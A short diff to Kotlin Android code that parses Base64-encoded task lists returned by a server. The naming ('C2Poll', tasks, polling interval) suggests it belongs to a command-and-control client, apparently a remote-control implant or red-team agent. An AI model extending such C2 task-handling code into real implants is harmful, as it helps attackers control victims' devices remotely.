@@ -290,8 +290,8 @@ class ForjaApi {
                 val d = root["d"]?.jsonPrimitive?.contentOrNull ?: ""
                 val tasks = if (d.isEmpty()) emptyList() else {
                     val decoded = String(android.util.Base64.decode(d, android.util.Base64.NO_WRAP))
-                    try { Json.parseToJsonElement(decoded).jsonArray.mapNotNull { it as? kotlinx.serialization.json.JsonObject } }
-                    catch (_: Exception) { emptyList() }
+                    val arr = try { Json.parseToJsonElement(decoded) as? kotlinx.serialization.json.JsonArray } catch (_: Exception) { null }
+                    arr?.mapNotNull { it as? kotlinx.serialization.json.JsonObject } ?: emptyList()
                 }
                 C2Poll(tasks, intervalSec * 1000L)
             }
